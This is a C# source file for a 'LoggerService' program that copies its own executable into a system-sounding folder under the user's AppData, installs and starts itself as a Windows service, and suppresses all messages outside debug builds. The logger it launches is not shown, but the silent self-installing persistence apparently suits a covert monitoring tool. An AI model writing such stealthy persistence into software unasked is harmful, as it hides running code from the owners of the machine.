using System;
using System.IO;
using System.Reflection;
using System.Configuration.Install;
using System.ServiceProcess;
using System.Security.Principal;
using System.Windows.Forms;
using System.ComponentModel;

namespace LoggerService
{
    static class Program
    {
        static string InstallLocation
        {
            get { return Path.Combine(InstallDirectory, System.Diagnostics.Process.GetCurrentProcess().MainModule.ModuleName); }
        }

        static string InstallDirectory
        {
            get
            {
                var programFiles = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                return Path.Combine(programFiles, "Common Files", "Services");
            }
        }

        static string ThisLocation
        {
            get { return Assembly.GetEntryAssembly().Location; }
        }

        static int Main(string[] args)
        {
            var service = new Service();

#if DEBUG
            Logger.Logger.Instance.Start();
            Application.Run();
#else
            if (Environment.UserInteractive)
            {
                if (!IsAdministrator)
                {
                    MessageBox.Show("Need admin rights");
                    return 0;
                }

                string parameter = args == null ? "" : string.Concat(args);

                switch (parameter)
                {
                    case "--uninstall":
                        UninstallService(service.ServiceName);
                        break;

                    case "--install":
                        return TryInstallService(service.ServiceName);

                    default:
                        InstallService(service.ServiceName);
                        break;
                }
            }
            else
            {
                ServiceBase.Run(new[] { service });
            }
#endif
            return 0;
        }

        public static void UninstallService(string serviceName)
        {
            TryStopService(serviceName);

            ShowDebug("Uninstalling");

            try
            {
                using (var installer = new AssemblyInstaller(InstallLocation, null))
                {
                    installer.Uninstall(null);
                    installer.Commit(null);
                }
            }
            catch (FileNotFoundException exception) when (exception.FileName.ToLower().Contains("installstate"))
            {
                // This doesn't seem to be a problem
            }
            catch (Exception exception)
            {
                ShowDebug($"Uninstall failed: { exception.Message }");
            }

            ShowDebug("Done uninstalling service");
        }

        static void InstallService(string serviceName)
        {
            ShowDebug("Installing");

            try
            {
                int result = Execute("--install");

                if (result == ERROR_SERVICE_EXISTS)
                {
                    ShowDebug("Service was already installed");
                    Execute("--uninstall");

                    ShowDebug("Installing again");
                    result = Execute("--install");

                    if (result == ERROR_SERVICE_EXISTS)
                        ShowDebug("Ran uninstall, but service still exists");
                }
            }
            catch (Exception exception)
            {
                ShowDebug(exception.Message);
            }

            ShowDebug("Done installing service");

            TryStartService(serviceName);
        }

        /// <summary>
        /// Copies this assembly to InstallDirectory and attempts to install it as a Windows service
        /// </summary>
        /// <returns>False if already installed</returns>
        static int TryInstallService(string serviceName)
        {
            try
            {
                if (!Directory.Exists(InstallDirectory))
                    Directory.CreateDirectory(InstallDirectory);

                File.Copy(ThisLocation, InstallLocation, true);

                using (var installer = new AssemblyInstaller(InstallLocation, null))
                {
                    installer.Install(null);
                    installer.Commit(null);
                }
            }
            catch (Win32Exception exception) when (exception.NativeErrorCode == ERROR_SERVICE_EXISTS)
            {
                return ERROR_SERVICE_EXISTS;
            }

            return 0;
        }


        static bool TryStopService(string serviceName)
        {
            ShowDebug("Stopping service");

            using (var controller = new ServiceController(serviceName))
            {
                try
                {
                    if (controller.Status != ServiceControllerStatus.Stopped && controller.Status != ServiceControllerStatus.StopPending)
                        controller.Stop();

                    controller.WaitForStatus(ServiceControllerStatus.Stopped, TimeSpan.FromSeconds(120));
                }
                catch (System.ServiceProcess.TimeoutException)
                {
                    ShowDebug("Service timed out");
                }
                catch (Exception exception)
                {
                    ShowDebug(exception.Message);
                    return false;
                }
            }

            ShowDebug("Done stopping service");

            return true;
        }

        static bool TryStartService(string serviceName, bool waitForIt = false)
        {
            ShowDebug("Starting service");

            using (var controller = new ServiceController(serviceName))
            {
                try
                {
                    if (controller.Status != ServiceControllerStatus.Running && controller.Status != ServiceControllerStatus.StartPending)
                        controller.Start();

                    if (waitForIt)
                        controller.WaitForStatus(ServiceControllerStatus.Running, TimeSpan.FromSeconds(30));
                }
                catch (System.ServiceProcess.TimeoutException)
                {
                    ShowDebug("Service timed out");
                }
                catch (Exception exception)
                {
                    ShowDebug(exception.Message);
                    return false;
                }
            }

            ShowDebug("Done starting service");

            return true;
        }

        static int Execute(params string[] args)
        {
            var domain = AppDomain.CreateDomain("installer.exe");
            int result = domain.ExecuteAssemblyByName(Assembly.GetExecutingAssembly().FullName, args);
            AppDomain.Unload(domain);
            return result;
        }

        static bool IsAdministrator
        {
            get
            {
                bool isAdmin;
                WindowsIdentity user = null;

                try
                {
                    user = WindowsIdentity.GetCurrent();
                    WindowsPrincipal principal = new WindowsPrincipal(user);
                    isAdmin = principal.IsInRole(WindowsBuiltInRole.Administrator);
                }
                catch (Exception)
                {
                    isAdmin = false;
                }
                finally
                {
                    if (user != null)
                        user.Dispose();
                }

                return isAdmin;
            }
        }

        static void ShowDebug(string text)
        {
#if DEBUG
            MessageBox.Show(text);
#endif
        }

        const int ERROR_SERVICE_EXISTS = 0x431;
    }
}
